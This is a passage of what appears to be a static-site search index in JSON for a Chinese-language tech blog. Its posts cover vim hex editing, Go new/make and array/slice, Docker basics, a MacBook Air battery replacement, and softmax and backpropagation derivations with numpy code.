    "url": "http:\/\/localhost:1313\/post\/hardware\/temp-sensor-comparasion\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/hex\/": {
        
        "title": "Hex",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/hex\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/programming\/vim-hex-editing\/": {
        
        "title": "使用vim进行16进制编辑",
            "tags": [ "vim",  "hex", ],
    "content": " 记录一下使用vim编辑二进制文件的方法，这个方法使用了vim执行 \u0026lsquo;%!\u0026rsquo; 来打开外部程序的小技巧。\n使用vim打开任意文件，并运行下面命令便进入16禁止编辑模式：\n:%!xxd 退出时一定要记得使用下面命令，将编辑的hexdump内容还原成二进制：\n:%!xxd -r 使用这个技巧需要注意的是打开二进制文件编辑模式必须使用\u0026rsquo;-b\u0026rsquo;参数，否则vim会在编辑内容末尾增加0x0a字符，保存的时候也就会增加一个字节的信息。\n使用\u0026rsquo;-b\u0026rsquo;参数：\n00000000: 0011 2233 ..\u0026quot;3 不使用\u0026rsquo;-b\u0026rsquo;参数：\n00000000: 0011 2233 0a ..\u0026quot;3. ", 
    "url": "http:\/\/localhost:1313\/post\/programming\/vim-hex-editing\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/programming\/go\/go-new-make\/": {
        
        "title": "Go语言中new与make的比较",
            "tags": [ "Go",  "new",  "make", ],
    "content": " go语言new()与make()的区别对于初入golang的开发者来说是个容易混淆的点，这里尝试对这两个的区别做一些总结。\n官方文档 首先查找官方文档中的描述，首先是关于\u0026rsquo;new()\u0026lsquo;的：\n1 2 3 4 // The new built-in function allocates memory. The first argument is a type, // not a value, and the value returned is a pointer to a newly // allocated zero value of that type. func new(Type) *Type 关于\u0026rsquo;make()\u0026rsquo;:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // The make built-in function allocates and initializes an object of type // slice, map, or chan (only). Like new, the first argument is a type, not a // value. Unlike new, make\u0026#39;s return type is the same as the type of its // argument, not a pointer to it. The specification of the result depends on // the type: //\tSlice: The size specifies the length. The capacity of the slice is //\tequal to its length. A second integer argument may be provided to //\tspecify a different capacity; it must be no smaller than the //\tlength, so make([]int, 0, 10) allocates a slice of length 0 and //\tcapacity 10. //\tMap: An empty map is allocated with enough space to hold the //\tspecified number of elements. The size may be omitted, in which case //\ta small starting size is allocated. //\tChannel: The channel\u0026#39;s buffer is initialized with the specified //\tbuffer capacity. If zero, or the size is omitted, the channel is //\tunbuffered. func make(t Type, size ...IntegerType) Type new() vs make() new() make() 定义 为需要创建的数据类型分配内存，返回一个指向分配内存的指针 为需要创建的slice/map/chan类型分配资源并初始化 输入 一个参数，指定需要创建的数据类型 多个参数，不同类型又专有意义 输出 指针 数据 使用场景 任意类型 只能用于slice/map/chan类型数据 new()的使用说明 1 2 3 var s3 = new([]int) *s3 = append((*s3), 0, 1) fmt.Println(s3) 输出如下：\n\u0026amp;[0 1] make()的使用说明 类型 说明 参数解释 slice 创建一个指定长度的slice 第一个参数(t)：所要创建的类型，例如[]int第二个参数(size)：指定slice的长度第三个参数（可选）：如果指定了这个参数，那么它说明了要创建的slice的容量(capacity)，并且这个参数必须大于等于size map 创建一个空的map，并且为map预留足够的空间可以存放size个元素 第一个参数（t）：指定要创建的类型，此处为map第二个参数（size）：指定map大小，让make预留出至少size个元素所需要的空间 channel 创建一个channel，并为这个channel初始化一个长度为size的buffer 第一个参数：指定channel类型，例如chan string第二个参数（size）：指定缓冲区的大小 1 2 3 4 5 6 7 8 var slice1 []int = make([]int, 10, 20) var slice2 = make([]int, 10, 20) var map1 map[int]string = make(map[int]string, 10) var map2 = make(map[int]string, 10) var chan1 chan string = make(chan string, 1024) var chan2 = make(chan string, 1024) ", 
    "url": "http:\/\/localhost:1313\/post\/programming\/go\/go-new-make\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/make\/": {
        
        "title": "Make",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/make\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/new\/": {
        
        "title": "New",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/new\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/array\/": {
        
        "title": "Array",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/array\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/programming\/go\/go-slice-array\/": {
        
        "title": "GO语言中array与slice的比较",
            "tags": [ "Go",  "array",  "slice", ],
    "content": " go语言中array与slice的区别总结\n数组array 切片slice 区别 声明定义 var arrayName [arrayLength] dataType var sliceName [] dataType 声明数组需要长度信息，定义slice时不需要 初始化 var arrayName = [arrayLength] dataType {Val1, \u0026hellip; Valn} var arrayName = [\u0026hellip;] dataType {Val1, \u0026hellip; Valn} var sliceName = [] dataType {Val1, \u0026hellip; Valn}var slice [] type = make([] type, length)通过数组初始化：slice := array[:]slice := array[startIndex:endIndex] 初始化数组时需要长度信息，初始化slice时不需要 取值 通过索引index取相应的元素值:arrayName[index] 通过index取元素值：slice[index] 返回一个新切片值: slice[startIndex:endIndex] slice取值除了可以获取一个元素的值外，还可以获取一个新的切片 赋值 元素赋值：array[index] = value 数组赋值： var new_array = array new_array := array 元素赋值： slice[index] = value 将单个单个值append()到slice中，返回的新slice长度会增加:slice = append(slice, v1, v2\u0026hellip;) 将一个slice copy()到另一个slice中，目标slice长度不变，最多copy截止到目标元素最后一个元素： copy(slice1, slice2) copy(slice1[si:], slice2) 数组支持简单的单元素或者整体赋值，slice则支持更加精细度的赋值 扩展 不支持 append()，新的slice length和capacity均发生变化： var slice = []int {1, 2, 3, 4, 5}slice = append(slice, 1, 2)fmt.Printf(\u0026ldquo;length: %d, capacity: %d\\n\u0026rdquo;, len(slice), cap(slice)) length: 7, capacity: 10 slice支持扩展，扩展后的新slice长度为新元素的个数，capacity是原capacity的2的指数倍 函数传参 值传递，被传递的array所有的值copy給形式参数，函数内对数组的改变不会传播给传入的数组 引用传递，函数内对slice的改变会反应到传入的参数中 数组是值传递，所以直接传递数组代价很高，使用slice相应代价会降低。因此go的标准库中多以slice实现 判断长度 len() len() 相同 ", 
    "url": "http:\/\/localhost:1313\/post\/programming\/go\/go-slice-array\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/slice\/": {
        
        "title": "Slice",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/slice\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/docker\/": {
        
        "title": "Docker",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/docker\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/docker\/": {
        
        "title": "Docker",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/docker\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/technology\/docker\/": {
        
        "title": "Docker",
            "tags": [ "Docker", ],
    "content": " 1. 配置docker repository 2. Docker image image（镜像）保存docker中的可运行系统的数据，当运行时docker把image加载到container（容器）中运行。\n2.1 获取docker image 命令： docker pull Docker Registry: 地址的格式一般是 \u0026lt;域名/IP\u0026gt; :端口号 ，默认是docker hub。 仓库名：格式\u0026lt;用户名\u0026gt;/\u0026lt;软件名\u0026gt;，默认是Docker hub的\u0026quot;Library\u0026quot;。 2.2 查询image 命令：docker images 2.3 删除镜像 命令： docker rmi\n但有时候会发现无法删除，原因可能是因为这个镜像可能被某个容器使用，即使是这个容器处于停止的状态也无法删除，这种时候可以先查询所有的容器信息，然后删除对应的容器再删除镜像，例如下面的例子：\n3. Container（容器） 首先了解一下容器的生命周期：\n3.1 创建一个容器 create命令用来创建一个容器，但不运行：\n3.2 直接启动一个Conainer(容器)并运行指定的image(镜像) 命令：docker run\ndocker run \u0026lt;仓库名\u0026gt;:\u0026lt;标签\u0026gt; 或 docker run \u0026lt;Image ID\u0026gt; 例子：\n-d：后台运行 -p：指定端口： -p port：把容器的port端口发布到host的随机端口 -p host_port:port：把容器的port发布到host的host_port端口 -p host_ip:host_port:port：把容器的port端口发布到主机的host_ip:host_port上 -P：发布容器的所有端口到主机的随机端口上 -it：这是两个参数，一个是 -i：交互式操作，一个是 -t 终端。我们这里打算进入 bash 执行一些命令并查看返回结果，因此我们需要交互式终端。 -v：指定卷 -v volume_path：启动容器并指定volume_path为卷 -v host_path:volume_path：启动容器并将volume_path映射到host的host_path上 \u0026ndash;volume-from：从别的容器中加载卷 \u0026ndash;rm：这个参数是说容器退出后随之将其删除。默认情况下，为了排障需求，退出的容器并不会立即删除，除非手动 docker rm。我们这里只是随便执行个命令，看看结果，不需要排障和保留结果，因此使用 \u0026ndash;rm 可以避免浪费空间。\n前台(Foreground)/后台(Detached)\n默认情况下容器再前台运行，如果需要后台运行可以指定\u0026rsquo;-d\u0026rsquo;参数，这时容器不再使用\u0026rsquo;docker run\u0026rsquo;这个终端作为I/O界面，只能通过网络或共享卷与这个容器通讯。\n如果一个容器处于后台状态可以用\u0026rsquo;attach\u0026rsquo;命令重新恢复前台状态。\n3.3 在运行的容器内执行命令 命令：docker exec\n例子：\n3.3 查询容器 一个运行状态的容器可以使用docker ps进行查询，但如果一个容器处于停止状态时则需要通过docker ps -a来进行查询了\n3.4 停止/运行一个容器 3.5 暂停/继续运行一个容器 3.6 重启一个容器 3.7 杀死容器 3.7 删除容器 删除指定容器：\n删除所有的容器：\n4. 其他命令 5. 高级使用 5.1 修改/提交镜像 当镜像在容器中运行起来之后可以像一般的系统使用一样对镜像中的文件进行修改，镜像修改过之后可以通过commit命令提交保存。\n5.2 网络 docker run有下面几个参数可以配置容器的网络参数：\nNone：\n将网络模式设置为none时，这个container将不允许访问任何外部router。这个container内部只会有一个loopback接口，而且不存在任何可以访问外部网络的router。\nBridge：\nDocker默认是将container设置为bridge模式。此时在host上面讲存在一个docker0的网络接口，同时会针对container创建一对veth接口。其中一个veth接口是在host充当网卡桥接作用，另外一个veth接口存在于container的命名空间中，并且指向container的loopback。Docker会自动给这个container分配一个IP，并且将container内的数据通过桥接转发到外部。\nHost：\n当网络模式设置为host时，这个container将完全共享host的网络堆栈。host所有的网络接口将完全对container开放。container的主机名也会存在于host的hostname中。这时，container所有对外暴露的port和对其它container的link，将完全失效。\nContainer：\n当网络模式设置为Container时，这个container将完全复用另外一个container的网络堆栈。同时使用时这个container的名称必须要符合下面的格式：\u0026ndash;net container:.\n比如当前有一个绑定了本地地址localhost的redis container。如果另外一个container需要复用这个网络堆栈，则需要如下操作：\n管理/etc/hosts：\n5.3 资源限制 5.4 添加设备 docker run可以将host中的设备映射到container中，并控制container对设备的访问权限：\n", 
    "url": "http:\/\/localhost:1313\/post\/technology\/docker\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/battery\/": {
        
        "title": "Battery",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/battery\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/diy\/": {
        
        "title": "DIY",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/diy\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/hardware\/mac_book_air_change_battery\/": {
        
        "title": "Macbook Air换电池记",
            "tags": [ "MacbookAir",  "换电池",  "Battery", ],
    "content": " 家里的Macbook Air年事已高电池也充不了电了，而且最近电池鼓包已经影响到了触摸板的使用，趁着假期买了块国产电池换上去。\n秀一下新电池和拆机工具： Air后盖的螺丝是特殊的5角形状必需用电池包里的黄色螺丝刀把10颗螺丝先拧下来： 拆下后盖发现鼓包的电池块了，没想到都鼓到这种程度了 -___-! 拆电池也很简单，用附带的黑色螺丝刀把图里面标红的螺丝拆下来就搞定了，别忘记把电池跟主板连接的插销取下来： 换电池之前给Air做了次内部SPA看起来清爽多了！ 安装电池也非常的方便，按照拆下来的顺序装回去就完成了！ ", 
    "url": "http:\/\/localhost:1313\/post\/hardware\/mac_book_air_change_battery\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/macbookair\/": {
        
        "title": "MacbookAir",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/macbookair\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/%E6%8D%A2%E7%94%B5%E6%B1%A0\/": {
        
        "title": "换电池",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/%E6%8D%A2%E7%94%B5%E6%B1%A0\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/matploblib\/": {
        
        "title": "Matploblib",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/matploblib\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/neural-network\/": {
        
        "title": "Neural Network",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/neural-network\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/neuralnetwork\/": {
        
        "title": "NeuralNetwork",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/neuralnetwork\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/numpy\/": {
        
        "title": "Numpy",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/numpy\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/sigmoid\/": {
        
        "title": "Sigmoid",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/sigmoid\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/softmax\/": {
        
        "title": "Softmax",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/softmax\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/machinelearning\/neuralnetwork\/softmax\/": {
        
        "title": "softmax输出层公式推导及代码实验",
            "tags": [ "NeuralNetwork",  "softmax",  "sigmoid",  "python",  "numpy",  "matploblib", ],
    "content": " sigmoid激活函数在神经网络中有着强大的通用性，但也存在这一些问题，比如：\n在w/b参数还没有训练成熟时，训练预测偏差较大，此时的训练速度会较慢。这个问题的解决方法有两种： 使用交叉熵代价函数: $ C = -{1\\over n} \\sum_{i=1}^n [y_i \\ln a_i + (1-y_i) \\ln (1-a_i)] $ 使用softmax和log-likelyhood代价函数作为输出层 sigmoid的输出结果是伯努利分布 $ P(y_1|X), P(y_2|X), \u0026hellip; P(y_n|X) $，说明每一个输出项之间是相互独立的，这在预测一种输出结果的情形时不太符合人们的直观感受。这个问题也可以用softmax输出层解决，因为softmax的输出是多项分布：$ P(y_1, y_2, \u0026hellip; y_n | X) $，其中y1, \u0026hellip; yn之间相互关联，且总和为1。 这样看起来softmax是个很有效的方法，下面就对这个方法进行一些研究。\nsoftmax定义： 将softmax层应用在网络输出层时，每一个神经元的softmax激活输出可以理解为该神经元对应结果的预测概率，这里有几个基本事实：\n每个神经元的输出为正数，并且输出数值介于0-1之间。 所有神经元的输出总和为1。 某一项输入（Z值）增大时，其对应的输出概率增大；同时其他输出概率同时减小（总和总是1）。该结论可以从$ \\frac {\\partial a_i} {\\partial {z_i}} $（总为正数）以及$ \\frac {\\partial a_i} {\\partial {z_j}}$（总为负数）推算出来，这两个数字也说明了softmax的输入／输出单调性。 softmax的每个激活输出值之间相互关联，表现出了输出非局部性特征。直观的理解就是因为所有激活输出的总和总是为1，那么其中一个激活输出的值发生变动的时候其他的激活输出也必将变化。这一点也是跟sigmoid激活函数的很不同的一点，也说明了$ \\frac {\\partial a_i} {\\partial {z_j}}$值存在的意义。 下图展示了softmax层工作的基本原理。\n应用场景： 从softmax的定义知道所有输出神经元的总和为1，因此softmax可以用在预测在多种可能性中只有一个结果的场景，比如mnist手写判定。\nsoftmax输出层组成的神经网络 下面的图展示了一个简单的softmax输出层神经网络，中间层依然使用sigmoid。\n代价函数C 为了解决在学习过程中出现的速度问题使用log-likelihood代价函数，函数定义为：\n$$ C=-\\sum_i^m y_i \\ln a_i $$ 关于实际应用这个等式需要解释一下。假设softmax输出层有4个输出，预测a值为(0.1, 0.2, 0.3, 0.4)，实际结果y为(0, 1, 0, 0)，那么这个等式为 $C = -(0\\ln(0.1) + 1\\ln(0.2) + 0\\ln(0.3) + 0\\ln(0.4))$，可以看出来因为0的存在可以让这个等式只保留实际结果为真（1）的项。这时可以把等式简化为：\n$$ C=-\\ln a_i | y_i=1 $$ 用反向传播进行梯度下降 反向传播算法要求几个关键值：\n$ \\delta_i^L $ $ \\frac {\\partial C}{\\partial w_{ij}^L} $ $ \\frac {\\partial C}{\\partial b_{i}^L} $ 如果输出层使用softmax时，最后一层（L层）的相应值与使用sigmoid的情况有些不同，下面对使用softmax是的这3个值进行推导。\n求解$ \\delta_i^L = ({a_i^L} - y_i) $ 过程如下：\n$$ {\\frac {\\partial C}{\\partial z_{i}^L}} = -(\\sum_k^m y_k {1 \\over {a_k^L}} {\\frac {\\partial {a_k^L}}{\\partial z_{i}^L}})$$ $$ {\\frac {\\partial C}{\\partial z_{i}^L}} = -(y_i {1 \\over a_i^L} \\frac {\\partial a_i^L}{\\partial z_{i}^L} + \\sum_{k \\neq i}^m y_k {1 \\over a_k^L} {\\frac {\\partial a_k^L}{\\partial z_{i}^L}})$$ $$ {\\frac {\\partial C}{\\partial z_{i}^L}} = - (y_i {1 \\over a_i^L} {a_i^L(1-a_i^L)} + \\sum_{k \\neq i}^m y_k {1 \\over a_k^L} (-{a_i^L}{a_k^L}) )$$ $$ {\\frac {\\partial C}{\\partial z_{i}^L}} = - (y_i (1-a_i^L) - \\sum_{k \\neq i}^m y_k {a_i^L})$$ $$ {\\frac {\\partial C}{\\partial z_{i}^L}} = - (y_i - {y_i a_i^L} - \\sum_{k \\neq i}^m y_k {a_i^L})$$ $$ {\\frac {\\partial C}{\\partial z_{i}^L}} = - (y_i - {a_i^L}{\\sum_{k=1}^m y_k})$$ $$ {\\frac {\\partial C}{\\partial z_{i}^L}} = ({a_i^L} - y_i)$$ 求$ \\frac {\\partial C}{\\partial w_{ij}^L} = ({a_i^L}-{y_i}){a_j^{L-1}} $的过程： $$ \\frac {\\partial C}{\\partial w_{ij}^L} = {\\delta_i^L} {a_j^{L-1}}$$ $$ \\frac {\\partial C}{\\partial w_{ij}^L} = ({a_i^L}-{y_i}){a_j^{L-1}}$$ 求$ \\frac {\\partial C}{\\partial b_{i}^L} = ({a_i^L} - y_i) $的过程： $$ \\frac {\\partial C}{\\partial b_{i}^L} = {\\frac {\\partial C}{\\partial z_{i}^L}} $$ $$ \\frac {\\partial C}{\\partial b_{i}^L} = {\\delta_i^L} = ({a_i^L} - y_i) $$ 以上求解过程中用了两个重要的计算等式:\n$ \\frac {\\partial a_i} {\\partial {z_i}} = a_i \\cdot (1- a_i) $ $ \\frac {\\partial a_j} {\\partial {z_i}} = -{a_i \\cdot a_j} | i \\neq j$ 下面对这两个等式进行推导：\n求导情况1: $ \\frac {\\partial a_i} {\\partial {z_i}} = a_i \\cdot (1- a_i) $ 结论： $$ \\frac {\\partial a_i} {\\partial {z_i}} = a_i \\cdot (1- a_i) $$ 推导过程： $$ = \\frac {\\partial}{\\partial {z_i}} (e^{z_i}) \\cdot {1 \\over {\\sum_{k=1}^m e^{z_k} }} + \\frac {\\partial}{\\partial {z_i}} ({1 \\over {\\sum_{k=1}^m e^{z_k} }}) \\cdot {e^{z_i}}$$ $$ = {e^{z_i} \\over {\\sum_{k=1}^m e^{z_k} }} + (-1) \\cdot {1 \\over ({\\sum_{k=1}^m e^{z_k} })^2} \\cdot {\\frac {\\partial}{\\partial z_i}({\\sum_{k=1}^m e^{z_k} })} \\cdot {e^{z_i}}$$ $$ = {e^{z_i} \\over {\\sum_{k=1}^m e^{z_k} }} + (-1) \\cdot {1 \\over ({\\sum_{k=1}^m e^{z_k} })^2} \\cdot (0+1){\\frac {\\partial}{\\partial z_i}({e^{z_i}})} \\cdot {e^{z_i}}$$ $$ = {e^{z_i} \\over {\\sum_{k=1}^m e^{z_k} }} + (-1) \\cdot ({e^{z_i} \\over {\\sum_{k=1}^m e^{z_k} }})^2$$ $$ = a_i - (a_i)^2 $$ $$ = a_i \\cdot (1- a_i) $$ 求导情况2: $ \\frac {\\partial a_j} {\\partial {z_i}} = -a_i \\cdot a_j$ 结论： $$ \\frac {\\partial a_j} {\\partial {z_i}} = -a_i \\cdot a_j$$ 推导过程： $$ = \\frac {\\partial}{\\partial {z_i}} (e^{z_j}) \\cdot {1 \\over {\\sum_{k=1}^m e^{z_k} }} + \\frac {\\partial}{\\partial {z_i}} ({1 \\over {\\sum_{k=1}^m e^{z_k} }}) \\cdot {e^{z_j}}$$ $$ = 0 \\cdot {1 \\over {\\sum_{k=1}^m e^{z_k} }} + (-1) \\cdot {1 \\over ({\\sum_{k=1}^m e^{z_k} })^2} \\cdot {\\frac {\\partial}{\\partial z_i}({\\sum_{k=1}^m e^{z_k} })} \\cdot {e^{z_j}}$$ $$ = (-1) \\cdot {1 \\over ({\\sum_{k=1}^m e^{z_k} })^2} \\cdot (0+1) \\cdot \\frac {\\partial}{\\partial z_i}e^{z_i} \\cdot {e^{z_j}}$$ $$ = (-1) \\cdot {1 \\over ({\\sum_{k=1}^m e^{z_k} })^2} \\cdot e^{z_i} \\cdot {e^{z_j}}$$ $$ = - {e^{z_i} \\over {\\sum_{k=1}^m e^{z_k}}} \\cdot {{e^{z_j}} \\over {\\sum_{k=1}^m e^{z_k}}}$$ $$ = -a_i \\cdot a_j$$ sigmoid隐藏层与softmax输出层网络 按照下图的拓扑构成的网络使用sigmoid进行隐藏层计算，使用softmax进行输出层计算，那么怎么进行网络训练呢？其实方法一样都是按照前馈网络计算代价值进行评估，使用反向传播算法进行梯度下降。\n前馈网络计算步骤： 在隐藏层的计算时使用sigmoid 在最后输出层使用softmax 反向传播计算步骤： 计算输出层，计算最后一层softmax输出层的下列值： $$ \\frac {\\partial C}{\\partial w_{ij}^L} = ({a_i^L}-{y_i}){a_j^{L-1}} = \\delta_i^L \\cdot a_j^{L-1} $$ $$ \\frac {\\partial C}{\\partial b_{i}^L} = ({a_i^L} - y_i) =\\delta_i^L $$ 计算隐藏层，反向一层一层计算sigmoid隐藏层的下列值： $$ \\frac {\\partial C}{\\partial w_{ij}^l} = \\delta_i^{l} \\cdot a_j^{l-1} $$ $$ \\frac {\\partial C}{\\partial b_{i}^l} = \\delta_i^{l} $$ 计算过程中可以发现只有最后一层的$ \\delta_i^L$计算较为特殊，计算权重和偏置的方法与之前的sigmoid构成的网络一致。\n代码实例 下面的例子实验一个输入层有4个输入，隐藏层有5个神经元并且使用sigmoid激活函数，输出层有2个神经元并使用softmax激活函数的网络，拓扑如下：\n# construct the network # input layer: 4 inputs # hidden layer: 5 neurons with sigmoid as activate function # * weight: 4x5 matrices # * bias: 1x5 matrices # output layer: 2 neurons with softmax as activate function # * weight: 5x2 matrices # * bias: 1x2 matrices # initialize the weight/bias of the hidden layer (2nd layer) w2 = np.random.rand(4, 5) b2 = np.random.rand(1, 5) # initialize the weight/bias of the output layer (3rd layer) w3 = np.random.rand(5, 2) b3 = np.random.rand(1, 2) num_epochs = 10000 eta = 0.1 x=[] y=[] # training process for i in xrange(num_epochs): # feed forward z2 = np.dot(input, w2) + b2 a2 = sigmoid(z2) z3 = np.dot(a2, w3) + b3 #z3 = np.dot(a2, w3) a3 = softmax(z3) if i%1000 == 0: print \u0026quot;Perception\u0026quot;, a3 print \u0026quot;W2\u0026quot;, w2 print \u0026quot;B2\u0026quot;, b2 print \u0026quot;W3\u0026quot;, w3 print \u0026quot;B3\u0026quot;, b3 x.append(i) y.append(cost(a3, output)) delta_l3 = a3 - output deriv_w3 = np.dot(a2.T, delta_l3) deriv_b3 = delta_l3 w3 -= eta*deriv_w3 b3 -= eta*np.mean(deriv_b3, 0) delta_l2 = np.dot(delta_l3, w3.T)*(a2*(1-a2)) deriv_w2 = np.dot(input.T, delta_l2) deriv_b2 = delta_l2 w2 -= eta*deriv_w2 b2 -= eta*np.mean(deriv_b2, 0) 完整代码\n参考 http://neuralnetworksanddeeplearning.com/chap3.html#softmax https://zhuanlan.zhihu.com/p/25723112 http://colah.github.io/posts/2015-09-Visual-Information/ ", 
    "url": "http:\/\/localhost:1313\/post\/machinelearning\/neuralnetwork\/softmax\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/backpropagation\/": {
        
        "title": "BackPropagation",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/backpropagation\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/bp\/": {
        
        "title": "BP",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/bp\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD\/": {
        
        "title": "反向传播",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/machinelearning\/neuralnetwork\/bp-experiment\/": {
        
        "title": "神经网络之反向传播算法",
            "tags": [ "BP",  "BackPropagation",  "反向传播", ],
    "content": " 之前使用神经网络算法的时候并没有认真总结关键的算法，虽然可以用但总觉得不爽，于是这两天对神经网络算法中的反向传播（Back Propagation）进行了推导。即理解了算法的数学本质，也对神经网络算法的工程特性有了深刻体会，工程算法真的是以解决问题为驱动的，追求的是解决问题的实用性。\n神经网络 网络拓扑 神经元 神经元是神经网络的基本构成，上图的每一个圆圈代表了一个神经元。每一个神经元有一个输入和一个输出，神经元的作用是对输入值进行计算。下图是一个神经元的简单示意图：\n该神经元的输出：$ a=f(z)=sigmoid(z) $ 神经元输入 在一个复杂点的神经网络中，一个神经元接收来自多个前级神经元的激活输出，并进行加权相加后产生该神经元的输入值，这个过程示意图如下：\n定义第 $ l^{th} $ 层第 $ j^{th} $ 个神经元的输入：\n神经元加权 神经元的加权结构可以看下面的示意图：\n注，第一层神经元的输入就是采样数据，不需要计算z值，这层采样数据直接通过权重计算输入到第二层的神经元。\n反向传播算法 代价函数 定义代价函数：$ cost = {1 \\over 2} \\sum (y^{(i)} - a^{(i)})^2 $\n神经元错误量 $ \\delta_j^{(l)} $ 每个神经元的输入记为\u0026rsquo;z\u0026rsquo;，经过激活函数\u0026rsquo;f(z)\u0026lsquo;生成激活值\u0026rsquo;a\u0026rsquo;，通常情况下激活函数使用sigmoid()。那么假设对于每个神经元的输入\u0026rsquo;z\u0026rsquo;做一点微小的改变记为 $ \\Delta z $，由这个改变引起的代价变化记为这个神经元的错误量 $ \\delta_j^{(l)} $，从这个定义可以看出来这是一个代价函数相对于神经元的输入\u0026rsquo;z\u0026rsquo;的偏导数。\n定义 $ \\delta_j^{(l)} $ 为 $ l^{th} $ 层中的第 $ j^{th} $ 个神经元的错误量，记作：$ \\delta_j^{(l)} =\\frac{\\partial C}{\\partial z_j^{(l)}} $\n经过数学推导可以得出结论：\n最后一层（L层）第j个神经元的错误量： $$ \\delta_j^{(L)} = -(y-a_j^{(L)}) \\bigodot [a_j^{(L)}(1-a_j^{(L)})] $$ 简单推导若成如下：\n$$ \\delta_j^{(L)} = \\frac{\\partial C}{\\partial z_j^{(l)}} $$ $$ \\frac{\\partial C}{\\partial z_j^{(l)}} = \\frac{\\partial C}{\\partial a_j^{(L)}} \\frac{\\partial a_j^{(L)}}{\\partial z_j^{(L)}} $$ $$ \\frac{\\partial C}{\\partial a_j^{(L)}} \\frac{\\partial a_j^{(L)}}{\\partial z_j^{(L)}} = -(y-a_j^{(L)}) \\bigodot [a_j^{(L)}(1-a_j^{(L)})] $$ y：采样的结果\n$ a_j^{(L)} $：样本输入计算的结果\n其余各层(l层)第j个神经元的错误量： 因为首先可以算出来每一层的激活量 $ a_j^{(l)} $，那么可以看出来除了最后一层外的其他层的错误量可以靠后面一层的错误量计算出来，直至推算到最后一层 $ \\delta_j^{(L)} $。\n因此反向传播算法也就是从最后一层往前一层一层计算的过程，与计算激活量的方向正好相反，因此得名反向传播。\n权重调整及偏置调整 观察每个神经元的输入可以发现神经网络计算过程中最重要的是要确定两个量权重w和偏置b。\n仿照错误量计算方法将问题进行一下转化，是否可以计算出代价函数相对于权重和偏置的变化速率（偏微分），然后通过乘以一个小数字（学习速率）来一点一点降低代价函数的输出，从而逼近最终需要的权重及偏置值呢？\n因此可以将问题转化为求 $ \\frac{\\partial C}{\\partial w_{jk}^{(l)}} $ 和 $ \\frac{\\partial C}{\\partial b_j^{(l)}} $\n通过推导可以得出：\n$$ \\frac{\\partial C}{\\partial w_{jk}^{(l)}} = \\delta_j^{(l+1)} a_k^{(l)} $$ $$ \\frac{\\partial C}{\\partial b_{jk}^{(l)}} = \\delta_j^{(l)} $$ 基于前面对于错误量 $ \\delta_j^{(l)} $ 就可以非常简单的得到相应的结果。\n那么最终对于权重及偏置的调整可以这样做：\n$$ w = w-\\eta \\frac{\\partial C}{\\partial w_{jk}^{(l)}} $$ $$ b = b-\\eta \\frac{\\partial C}{\\partial b_{jk}^{(l)}} $$ 其中 $ \\eta $ 是一个非常小的正数，这个数字也被叫做“学习速率”，通过这个值的调整可以控制拟合的速度。\n推导过程 前面的部分直接使用了结论，实际推到过程比较啰嗦，markdown直接编写公式也不方便，索性把推到过程的草稿贴出来参考好了\n:-)\n实验代码 做一个简单的神经网络实验，网络设计为3层，第一层对应3个输入，第二层用4个神经元，第三层为输出层使用1个神经元。\n网络初始化过程如下：\n# network design: # input(layer_1): 3 nodes # weights: 3x4 matrix # layer_2: 4 nodes # weights: 4x1 matrix # output: 1 node # create training data input = np.array([[0, 0, 1], [0, 1, 0], [0, 1, 1], [1, 0, 0], [1, 0, 1]]) # create the label related with the input training data output = np.array([[0], [1], [0], [1], [1]]) # initialize random weight weight_layer_1 = np.random.rand(3, 4) weight_layer_2 = 